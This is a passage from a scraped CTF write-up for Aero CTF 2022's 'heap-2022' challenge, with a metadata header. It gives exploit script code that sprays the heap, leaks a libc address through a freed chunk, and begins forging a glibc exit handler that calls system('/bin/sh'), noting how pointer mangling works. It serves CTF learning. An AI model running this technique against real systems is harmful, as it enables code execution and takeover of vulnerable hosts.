@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/34804
+CHALLENGE: CTFtime.org / Aero CTF 2022 / heap-2022 / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: heap_exploitation
+DIFFICULTY: Hard
+PROTECTIONS: Canary
+KEY_FUNCTIONS: malloc, free, system, read
+KEY_TECHNIQUE: Writeup for CTFtime.org / Aero CTF 2022 / heap-2022 / Writeup — heap_exploitation exploitation technique.
+---
+se_bit is set (e.g. 0x20 would not work!) # As I am too lazy to calculate the correct offset, we just do heap spraying :P add((p64(0x420) + p64(0x21)) * 6) # If we free this chunk, a pointer to glibc's main arena can be read from the chunk's fwd and bwd pointer free(heap + 0x310) # Careful! Heap allocations can be served from the chunk in the unsorted bin, shrinking it from the beginning of said chunk. # Unfortunately, our read primitive allocates, so that after the allocations the fwd and bwd pointer are at offset 0x3a0 # instead of 0x310 (I also refused to use math for this one and did it in GDB) libc.address = u64(read(heap + 0x3a0, 8)) - 0x219ce0 __exit_funcs = libc.address + 0x219838 log.info (f'libc         @{hex(libc.address)}') log.info (f'__exit_funcs @{hex(__exit_funcs)}') # We need to pop a shell after all. So what do we do next? # Normally I'd just overwrite `__free_hook` with `system`, but glibc 2.34 removed the malloc hooks... # Now, we have to use the __exit_funcs array which is way more complicated >:( # I used this blogpost to figure it out: https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html # To summarize it, we have to create exit_funcs_list on the heap and put the `system` function there with "/bin/sh\x00" # as an argument (using the ex_cxa function type) # It is advisable to read the source code to understand how and why: # Here is the type definition: https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.h # And here how the handlers are executed: https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c # But most importantly, glibc uses pointer mangling to "encrypt" stored function pointers # The reasoning is that it makes it harder to write exploits (it really does) # How does it work? #   pointer encryption: rotateleft(ptr ^ key, 0x11) #   pointer decryption: rotateright(ptr, 0x11) ^ key # where key is a random value set at program start (similar to the stack canary) # To find this key, we will need to
